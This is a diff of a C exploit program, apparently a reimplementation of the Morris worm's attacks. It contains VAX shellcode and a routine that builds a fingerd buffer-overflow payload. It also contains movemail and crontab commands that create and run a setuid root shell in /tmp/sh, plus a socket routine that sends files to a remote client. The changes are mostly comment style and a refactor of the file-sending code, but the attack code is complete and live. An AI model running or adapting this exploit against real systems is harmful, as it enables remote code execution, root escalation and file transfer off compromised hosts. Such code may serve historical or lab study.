@@ -8,24 +8,29 @@
 #include <arpa/inet.h>
 #include <unistd.h>
 
-#define TARGET_IP "172.20.0.10" // should be the ip of target_prime
 #define FINGERD_PORT 79
 
-// Buffer overflow related things
-#define BUF_SIZE 512 + 16 + 4 // finger buffer size + four 4 byte words + 4byte address
+/* Buffer overflow related things */
+#define BUF_SIZE 512 + 16 + 4 /* finger buffer size + four 4 byte words + 4byte address */
 #define PAYLOAD "\335\217/sh\0\335\217/bin\320^Z\335\0\335\0\335Z\335\003\320^\\\274;\344\371\344\342\241\256\343\350\357\256\362\351"
 #define PAYLOAD_LEN 28
-#define NOP 0x01	// VAX nop instruction
+#define NOP 0x01	/* VAX nop instruction */
 					
 #define PATIENCE 3					
 #define IO_BUF_SIZE 2048
 
-// Movemail exploit commands from rapid7 article
+/* Movemail exploit commands from rapid7 article */
 #define MOVEMAIL_EXPLOIT "(umask 0 && /etc/movemail /dev/null /usr/lib/crontab.local)\n"
 #define CRONTAB_EXPLOIT "(echo \"* * * * * root cp /bin/sh /tmp && chmod u+s /tmp/sh\"; echo  \"* * * * * root rm -f /usr/lib/crontab.local\") > /usr/lib/crontab.local\n"
-#define CHECK_FOR_SHELL "ls /tmp/sh\n" // this needs to be ran multiple times until cronjob does its thing
+#define CHECK_FOR_SHELL "ls /tmp/sh\n" /* this needs to be ran multiple times until cronjob does its thing */
 #define RUN_SHELL "/tmp/sh\n" 
 #define NOT_FOUND "/tmp/sh not found"
+
+struct file_object {
+	char *file_name;
+	FILE *file_ptr;
+	int file_size;
+};	
 
 /* 
  *	Wrapper to set of sockaddr_in struct 
@@ -64,11 +69,11 @@ void create_exploit(char *buf, char *shellcode, ssize_t buf_size, size_t shellco
     for (i = 0; i < buf_size; i++) buf[i] = NOP;  
     for (j = 0; j < shellcode_len; j++) buf[300+j] = shellcode[j]; 
 
-	// from rapid7 article
+	/* from rapid7 article */
 	for (i = buf_size - extra_words - address_size; i < buf_size - address_size; i ++) { 
 		buf[i] = 0x00; 
 	}
-	// some place within the buffer
+	/* some place within the buffer */
     for (i = buf_size - address_size; i < buf_size; i += 4) {
         buf[i]   = 0x38; 
         buf[i+1] = 0xea;
@@ -105,7 +110,7 @@ void read_from_sock(int sock, char *io_buf, size_t buf_size) {
 			int n = read(sock, io_buf, buf_size - 1);
 			if (n > 0) {
 				io_buf[n] = '\0'; 
-				printf("%s", io_buf); // Print results to your screen
+				printf("%s", io_buf); /* Print results to your screen */
 				fflush(stdout);
 				num_tries = 0; 
 			} else {	
@@ -172,7 +177,7 @@ void get_root_shell_via_movemail_exploit(int sock, char *io_buf, size_t buf_size
 	write_to_sock(sock, MOVEMAIL_EXPLOIT);
 	write_to_sock(sock, CRONTAB_EXPLOIT);
 
-	// because cronjob has to run, block here until /tmp/sh is found
+	/* because cronjob has to run, block here until /tmp/sh is found */
 	do {
 		write_to_sock(sock, CHECK_FOR_SHELL);
 		read_from_sock(sock, io_buf, buf_size);
@@ -180,7 +185,7 @@ void get_root_shell_via_movemail_exploit(int sock, char *io_buf, size_t buf_size
 		sleep(10);
 	} while (!strncmp(NOT_FOUND, io_buf, strlen(NOT_FOUND)));
 
-	// running the shell with setuid bit set
+	/* running the shell with setuid bit set */
 	write_to_sock(sock, RUN_SHELL);
 }	
 
@@ -188,16 +193,16 @@ void get_root_shell_via_movemail_exploit(int sock, char *io_buf, size_t buf_size
  * 
  */
 long int get_file_size(FILE *file_ptr) {
-    // checking if the file exist or not
+    /* checking if the file exist or not */
     if (file_ptr == NULL) {
         printf("File Not Found!\n");
         return -1;
     }
 
-	// seek until the end of file
+	/* seek until the end of file */
     fseek(file_ptr, 0L, SEEK_END);
 
-    // calculating the size of the file
+    /* calculating the size of the file */
     long int res = ftell(file_ptr);
 
 	rewind(file_ptr);
@@ -249,49 +254,58 @@ int receive_int(int *num, int fd)
     return 0;
 }
 
+int load_files(char **file_paths, int num_files, struct file_object* files) {
+	int i;  
+	for (i = 0; i < num_files; i++) {
+		files[i].file_name = file_paths[i]; 
+		files[i].file_ptr = fopen(file_paths[i], "r");
+		if (files[i].file_ptr == NULL) return -1;
+		files[i].file_size = get_file_size(files[i].file_ptr);
+	}	
+	return 0;
+}	
+
 int send_files(
 		int client_sock, 
-		FILE **file_ptrs, 
-		char **file_names, 
+		struct file_object *files, 
 		int num_files,
 		char *file_buf,
 		int buf_size) { 
-	int i;
-	int j;
+	int i, j;
 	int len;
 	int file_size;
 	int response;
 	char *file_name;
 
-	// communicate number of files to send
+	/* communicate number of files to send */
 	if (send_int(num_files, client_sock) < 0) return -1;
 	
-	// ensure that the client socket knows how many files to recieve
+	/* ensure that the client socket knows how many files to recieve */
 	if (receive_int(&response, client_sock) < 0) return -1;
 	if (response != num_files) return -1;
 	printf("Client expecting %d files\n", response);
 	
-	// try to send the files
+	/* try to send the files */
 	for (i = 0; i < num_files; i++) {	
-		// first send the length of the file name
-		file_name = file_names[i];
+		/* first send the length of the file name */
+		file_name = files[i].file_name;
 		len = strlen(file_name);
 		if (send_int(len, client_sock)) return -1;
 
-		// actually send the file name 
+		/* actually send the file name  */
 		send(client_sock, file_name, len, 0);
 		
-		// send the file and rewind file pointer
-		file_size = get_file_size(file_ptrs[i]);
+		/* send the file and rewind file pointer */
+		file_size = files[i].file_size; 
+		printf("%s %d\n", file_name, file_size);
 		if (file_size < 0) return -1;
 		if (send_int(file_size, client_sock) < 0) return -1; 	
-		while (fgets(file_buf, buf_size, file_ptrs[i]) != NULL) {
+		while (fgets(file_buf, buf_size, files[i].file_ptr) != NULL) {
 			send(client_sock, file_buf, strlen(file_buf), 0);
 		}	
-		printf("Sent file %s\n", file_name);
-		rewind(file_ptrs[i]);
+		rewind(files[i].file_ptr);
 
-		// wait until the client says it recieved the file
+		/* wait until the client says it recieved the file */
 		if (receive_int(&j, client_sock) < 0) return -1;
 		if (i != j) return -1;
 	}	
